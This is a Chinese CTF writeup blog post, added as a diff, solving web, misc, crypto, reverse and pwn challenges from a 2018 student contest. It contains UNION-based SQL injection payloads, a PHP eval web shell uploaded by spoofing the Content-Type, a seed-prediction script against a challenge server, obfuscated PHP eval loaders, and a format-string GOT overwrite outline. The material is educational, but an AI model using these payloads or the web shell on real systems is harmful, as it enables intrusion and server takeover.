@@ -1,0 +1,420 @@
+---
+layout: post
+title:  "2018.12.1 第一届“w0odpeck3r”杯官方writeup"
+tags: [writeup]
+date: 2018-12-01
+comments: false
+---
+# 第一届“w0odpeck3r”杯官方writeup
+
+------
+
+>周末举办的一次小比赛，[链接][lj]。(fbctf给我整自闭了。三分钟宕机一次)
+
+## web
+
+### 1.sql
+
+> 这是一道简单的sql注入题目。只不过把上传与sql注入结合起来了。服务器解析上传文件的内容，将内容传入sql查询返回查询结果。
+
+因此，尝试传入一个文件，内容为1，发现得到查询结果。
+经过多次尝试，发现是没有任何包裹的查询，代码大概是:
+
+```sql
+select * from table where id = $id;
+```
+
+* 直接判断列数，构造查询语句:1 order by 2，发现是2。
+* 接着爆显示位，构造查询语句：-1 union select 1,2，发现2回显了
+* 然后查库:-1 union select 1,database()
+* 查表:-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()，发现有个叫做`flag`的表。
+* 查列名:-1 union select 1,group_concat(column_name) from information_schema.columns where table_name=flag，发现列名为`flag`
+* 查数据:-1 union select 1,flag from \`flag\`
+* 得到flag
+
+### 2.upload
+
+> 这是一道简单的上传题目。
+
+* 题目要求上传png/jpeg文件，上传后会返回文件路径，因此可以上传一句话木马，拿到shell。
+* 先传一个图片，抓包得到`Content-Type: image/jpeg`
+* 然后直接上传一个yijuhua.php，内容为:
+
+```php
+GIF89a<?php @eval($_POST['pass']) ?>
+```
+
+burp抓包拦下来，修改content-type为image/jpeg<br/>
+![bp](https://raw.githubusercontent.com/leeeddin/leeeddin.github.io/master/_posts/bp.png)<br/>
+* 然后得到文件上传路径，菜刀直接连接，发现flag在目录里.<br/>
+![cd](https://raw.githubusercontent.com/leeeddin/leeeddin.github.io/master/_posts/cd.png)<br/>
+![cdflag](https://raw.githubusercontent.com/leeeddin/leeeddin.github.io/master/_posts/cdflag.png)<br/>
+
+### 3.guessnext
+
+> 这是一道简单的代码审计题目，意在让大家了解伪随机数。
+
+* 当随机数种子固定时，使用mt_rand()生成的随机数就是固定的。
+
+> 题目源码如下:
+
+```php
+<?php 
+highlight_file(__file__); 
+include('getflag.php'); 
+function getflag($what,$guess) 
+{ 
+    global $flag; 
+    if ($what === intval($guess)) { 
+        echo $flag; 
+    } 
+    else{ 
+        die("try again!"); 
+    } 
+
+} 
+echo phpversion().'<br/>'; 
+$time = time(); 
+echo time().'<br/>'; 
+mt_srand($time); 
+echo mt_rand(1,10000).'<br/>'; 
+echo mt_rand(1,10000).'<br/>'; 
+echo mt_rand(1,10000).'<br/>'; 
+echo mt_rand(1,10000).'<br/>'; 
+echo mt_rand(1,10000).'<br/>'; 
+if (isset($_GET["guess"])) { 
+    getflag(mt_rand(1,10000),$_GET["guess"]); 
+} 
+
+```
+
+* 阅读源码发现首先打印出服务器运行的php版本，服务器当前的时间(每`1s`为单位)，并且将此时间作为了随机数种子。
+* 之后打印出了5个随机数，并将第六个随机数与用户输入共同传入了一个函数getflag():如果第六个随机数与用户传入的参数相同，则打印出flag.
+* 由前面可知如果我们可以得到它的随机数种子，便可以得到它产生的所有随机数。而这个种子就是服务器当前时间，因此我们可以：
+> * 1 在本地起一个php，用于接收种子，产生随机数
+> * 2 访问题目，得到随机数种子(服务器当前时间)
+> * 3 访问本地网页，传入上面得到的随机数种子，得到第六个随机数
+> * 4 访问题目，GET方法传入上面得到的随机数
+> * 5 得到flag
+* 如果上面的2，3，4，5能在1s之内完成，就会得到flag
+
+下面给出解题需要的代码,首先是运行在本地的php源码:
+```php
+<?php
+$t = $_GET['t'];
+
+mt_srand($t);
+mt_rand(1,10000);
+mt_rand(1,10000);
+mt_rand(1,10000);
+mt_rand(1,10000);
+mt_rand(1,10000);
+echo mt_rand(1,10000);
+```
+
+然后是访问用的python脚本:
+```python
+import requests,re
+
+url1 = "http://47.106.175.26:20002/"
+
+r = requests.get(url1)
+
+time = re.findall('''</code>5.5.9-1ubuntu4.6<br/>([0-9]+)<br/>''',r.text)
+
+#print time[0]
+
+url2 = "http://127.0.0.1/zzl/mtrand/test.php?t=%s"%time[0]
+
+r2 = requests.get(url2)
+
+#print r2.text
+
+url3 = "http://47.106.175.26:20002/?guess=%s"%(r2.text)
+
+r3 = requests.get(url3)
+
+print r3.text
+#print url3
+```
+
+* 将php放到合适的路径，运行python几次即可得到flag
+
+-----
+
+## misc
+
+### 1.happy
+
+> m00yy给的题目，好像是某个比赛原题，一共三个考察点，较为简单。
+
+* 1.暴力破解
+* 2.crc32碰撞
+* 3.png文件头修改
+
+### 2.wifikiller
+
+> 湖湘杯2018线上复赛原题，较为简单，考了一个知识点。
+
+* 1.下来是一个pcap，wireshark打开发现是802.11,aircrack-ng跑出来密码。
+* 2.wireshark中`编辑-首选项-Protocols-IEEE 802.11-Edit`加入上面跑出来的密码，类型为wpa-pwd就可以。
+* 3.导入密码后发现多了几个包，`文件-导出对象-HTTP`，可以发现flag
+
+-----
+
+## crypto
+
+### 1.phpthebest
+
+> 领航杯原题，本地搭建环境一步一步echo出各个变量的内容分析，较为简单。直接贴出来分析后的文件。
+
+```php
+<!-- <?php 
+
+
+function asciitostr($sacii){$asc_arr= str_split(strtolower($sacii),2);$str='';for($i=0;$i<count($asc_arr);$i++){$str.=chr(hexdec($asc_arr[$i][1].$asc_arr[$i][0]));}return mb_convert_encoding($str,'UTF-8','GB2312');}
+ function encrypt($string,$operation,$key='')
+  {
+    $key=md5($key);
+    $key_length=strlen($key);
+    $string=$operation=='D'?base64_decode($string):substr(md5($string.$key),0,8).$string;
+    $string_length=strlen($string);
+    $rndkey=$box=array();
+    $result='';
+    for($i=0;$i<=255;$i++)
+    {
+      $rndkey[$i]=ord($key[$i%$key_length]);
+      $box[$i]=$i;
+    }
+    for($j=$i=0;$i<256;$i++)
+    {
+      $j=($j+$box[$i]+$rndkey[$i])%256;
+      $tmp=$box[$i];
+      $box[$i]=$box[$j];
+      $box[$j]=$tmp;
+    }
+    for($a=$j=$i=0;$i<$string_length;$i++)
+    {
+      $a=($a+1)%256;
+      $j=($j+$box[$a])%256;
+      $tmp=$box[$a];
+      $box[$a]=$box[$j];
+      $box[$j]=$tmp;
+      $result.=chr(ord($string[$i])^($box[($box[$a]+$box[$j])%256]));
+    }
+    if($operation=='D')
+    {
+      if(substr($result,0,8)==substr(md5(substr($result,8).$key),0,8))
+      {
+        return substr($result,8);
+      }
+      else
+      {
+        return'';
+      }
+    }
+    else
+    {
+      return str_replace('=','',base64_encode($result));
+    }
+  }
+
+$id = "yTKTBFfoj6AU4qsnucxp2OUNU9nb5AvFJZhqEqKsktDPIj0jbmsXwVoQRqQ8eyUPtBaNX1QOrj5xK6qWLB2IXV0vAjQVzjTuC7cdmazeaOkrAshuglEdh5cP3S/8bTAYM14pf0xmbb/ub1E+yxEoSnwA";
+
+
+$a="Je8B5s7wI5B2S2b521JE8wTzAwMD0iaE5zRW1JcWlmV3VRRFpTa1ZvZ0ZsVWR4WW5yeVBLT3p0anZiSEdhSnBNQkFYd1RMY0NSZXh2VGZNSmxLckN3UEhJVU5TYmNpcUFZc2FRVkdnV2hwRG16QlpGT2VMdXlvalJua2RYdEVnSDlST1pvdlhLdE11bnRRZ1VlTUladnhFMnR4ZDJ0eGQydHBhUzlOZDJpOUptVHZYS3RNdW5TUWdVZXhkMnQ3ZDJpTmFqdk5hanZySUZJTUladjlKbVR2WEt0MElDMVJnVWV4ZDJ0TUkzdEdJallzdW11MHZuYTNoSE5SRWpTTEIzeVRPMkxiQk1lMkkySW1ZTXRNSTNQS2hSMFdlWnlHSVM5TUJGaVFnVWVNQkZpUUVHSjdIUGJOZEY5cGoySVRhQ2Q5SlEwS2hSMFdlRklUYUNkOUpLSjdIUExNQjNKYmVGTjl1SFROT25ScHVtVE5PVVRWV2pUdlhjTk5CUVNESkgwY0JqdHJkTWl3SVhjUmtIdVJXblR2WGNOTklNc3hJcDBOSU1zeElHNE5ZRlNEZGlUTkJRU0RqblR2WGNOTkltZjB2bTBLSUNKc2huZFJ1cE4wYW5QcHVubzB2bmEwdm5jMHVwTjV2TWYwdUZ1MkluY0toUjBXclAwV2VGYXNhQ2Q5ZVp5R0lTOU1CRmlRa0t0TXVuUDJrS3RSQjN2cklNc3hJcFR2WG04KyI7ZXZhbCgnPz4nLiRPMDBPME8oJE8wT08wMCgkT08wTzAwKCRPME8wMDAsJE9PMDAwMCoyKSwkT08wTzAwKCRPME8wMDAsJE9PMDAwMCwkT08wMDAwKSwkT08wTzAwKCRPME8wMDAsMCwkT08wMDAwKSkpKTs=Je8B5s7wI5B2S2b521";
+$O00OO0=urldecode(encrypt($id, "D", "mima"));
+$O00O0O=$O00OO0{3}.$O00OO0{6}.$O00OO0{33}.$O00OO0{30};
+$O0OO00=$O00OO0{33}.$O00OO0{10}.$O00OO0{24}.$O00OO0{10}.$O00OO0{24};
+$OO0O00=$O0OO00{0}.$O00OO0{18}.$O00OO0{3}.$O0OO00{0}.$O0OO00{1}.$O00OO0{24};
+$OO0000=$O00OO0{7}.$O00OO0{13};
+$O00O0O.=$O00OO0{22}.$O00OO0{36}.$O00OO0{29}.$O00OO0{26}.$O00OO0{30}.$O00OO0{32}.$O00OO0{35}.$O00OO0{26}.$O00OO0{30};
+/*echo $O00O0O.'<br>';
+echo asciitostr("A45683245337737794532423352326532313").'<br>';
+$b =  eval($O00O0O( str_replace(asciitostr("A45683245337737794532423352326532313"),"",$a)));
+echo var_dump($b);
+echo 1;*/
+echo $OO0000;
+$ss="hNsEmIqifWuQDZSkVogFlUdxYnryPKOztjvbHGaJpMBAXwTLcCRexvTfMJlKrCwPHIUNSbciqAYsaQVGgWhpDmzBZFOeLuyojRnkdXtEgH9ROZovXKtMuntQgUeMIZvxE2txd2txd2tpaS9Nd2i9JmTvXKtMunSQgUexd2t7d2iNajvNajvrIFIMIZv9JmTvXKt0IC1RgUexd2tMI3tGIjYsumu0vna3hHNREjSLB3yTO2LbBMe2I2ImYMtMI3PKhR0WeZyGIS9MBFiQgUeMBFiQEGJ7HPbNdF9pj2ITaCd9JQ0KhR0WeFITaCd9JKJ7HPLMB3JbeFN9uHTNOnRpumTNOUTVWjTvXcNNBQSDJH0cBjtrdMiwIXcRkHuRWnTvXcNNIMsxIp0NIMsxIG4NYFSDdiTNBQSDjnTvXcNNImf0vm0KICJshndRupN0anPpuno0vna0vnc0upN5vMf0uFu2IncKhR0WrP0WeFasaCd9eZyGIS9MBFiQkKtMunP2kKtRB3vrIMsxIpTvXm8+";
+eval(base64_decode());
+$c = strtr(substr($ss,104),substr($ss,52,52),substr($ss,0,52));
+echo $c;
+ ?> -->
+<?php
+$f14g="fdsa{dasdasdsa_dsa}";
+$f15g="asd{sadasdas_dffds}";
+$temp="asdfgtrewq234567890yuioplkjhnbvgfcvdfgt";
+$pre_flag="flag{";
+$pos_flag="}";
+$flag="";
+for($i=0;$i<32;$i++){
+  $num = mt_rand(0,30);
+  $flag=$flag.$temp[$num];
+  $f146="eb1970394a431045645843996a40c6e8";
+}
+$f1ag=$pre_flag.$f146.$pos_flag;
+echo $f1ag;
+echo $flag;
+?>
+```
+
+### 2.simplex0r
+
+> 简单的crypto。
+
+* 1.给出一个加密脚本，一个真正的密文，一个假密文，一个假明文
+
+encode.py内容如下:
+
+```python
+import base64
+def str2num(s):
+	return int(s.encode("hex"),16)
+def num2str(n):
+	return hex(n)[2:].split("L")[0].decode("hex")
+key = "???"
+intkey = str2num(key)
+
+fake1 = str2num(open("fakeplaintext.txt","r").read())
+fake2 = base64.b64encode(num2str(fake1 ^ intkey))
+
+open("fakecipher.txt","w").write(fake2)
+
+flag = "???"
+cipher = ""
+for x in range(0,len(flag)):
+	cipher += chr(ord(flag[x]) ^ ord(key[x%len(key)]))
+open("cipher.txt","w").write(base64.b64encode(cipher))
+```
+
+* 2.看下脚本，fake1和fake2都已经给出，异或可以得到intkey
+* 3.将key的每一位与cipher的每一位异或得到flag
+* 4.解密脚本如下:
+
+```python
+import base64
+def str2num(s):
+	return int(s.encode("hex"),16)
+def num2str(n):
+	return hex(n)[2:].split("L")[0].decode("hex")
+f2 = int(str2num(base64.b64decode("dzAwZHBlY2szcgwBXTtEOgUKWBcTCQAAAwANCBE=")))
+f1 = str2num("w00dpeck3r{1m_4_fake_fllllag}")
+print f1
+print f2
+key = num2str(f1^f2)
+ci = base64.b64decode("AAAAAAAAAAAAADcnDSQOJA0wFUdFbwMfCgc0ByYTPxUYB1wCEg==")
+flag = ""
+for x in range(0,len(ci)):
+	flag += chr(ord(ci[x])^ord(key[x%len(key)]))
+print flag
+```
+
+-----
+
+## re
+
+### recursive
+
+> nctf2018原题，考察点：递归。
+
+* 1.主函数:
+![rec1](https://raw.githubusercontent.com/leeeddin/leeeddin.github.io/master/_posts/rec1.png)
+
+* 2.关键递归函数，接受一个64字节的输入，按规定的顺序将输入值赋给全局变量s1
+![rec2](https://raw.githubusercontent.com/leeeddin/leeeddin.github.io/master/_posts/rec2.png)
+
+* 3.从递归函数出来之后，将s1与固定字符串比较，相等则进入，可以看到有两个关键递归函数，两个strcmp，其实两个的结果都一样
+
+> 解题脚本:
+
+```python
+r = 0
+v = 0
+dic = {}
+dic2 = {}
+def digui(a):
+	global r,v
+	re = 0
+	if(a<=63):
+		v = r
+		r += 1
+		dic[a]=v
+		#print v,a
+		digui(2*a+1)
+		re = digui(2*(a+1))
+	return re
+
+def digui2(a,b=0):
+	global r,v
+	re = 0
+	if(a<=63):
+		digui2(2*a+1,0)
+		v = r
+		r += 1
+		dic2[a]=v
+		#print v,a
+		re = digui2(2*(a+1),0)
+	return re
+digui(0)
+r = 0
+v = 0
+digui2(0)
+#print dic
+
+s1 = "bcec8d7dcda25d91ed3e0b720cbb6cf202b09fedbc3e017774273ef5d5581794"
+s2 = "7d8dcdcaed592e1dcb07e02c36bcb2f0bf9e0bdcb0e13777237e25fd48515974"
+
+flag1 = ""
+flag2 = ""
+for x in dic:
+	flag1 += s1[dic[x]]
+
+for x in dic2:
+	flag2 += s2[dic2[x]]
+print flag1,flag2
+
+```
+
+### babyre
+
+> 简单的逆向分析。
+
+* 1.主函数，可以看到有三次判断:<br/>
+![bbre1](https://raw.githubusercontent.com/leeeddin/leeeddin.github.io/master/_posts/babyre1.png)
+* 2.第一次：异或
+* 3.第二次：ascii减3
+* 4.第三次：base64解密
+
+>解题脚本:
+
+```python
+import base64
+
+s1 = 'dAP6L5H`e5Tn'
+s2 = '`kOc`jS/WUGw'
+s3 = 'aW5nIQ=='
+flag = ""
+for x in s1:
+	flag += chr(ord(x) ^ 6)
+for x in s2:
+	flag += chr(ord(x) + 3)
+flag += s3
+print base64.b64decode(flag)
+```
+
+-----
+
+## pwn
+
+### repeater
+
+> 科来杯原题，格式化字符串。
+
+* 1.看到有一个getflag函数，但是需要某个数值为0x2018，但默认只有一次输入
+* 2.第一次改循环输入次数
+* 3.第二次改0x2018
+* 4.第三次改puts@got为getflag
+* 5.getflag
+细节及图待补充
+
+[lj]: https://128.199.235.237/
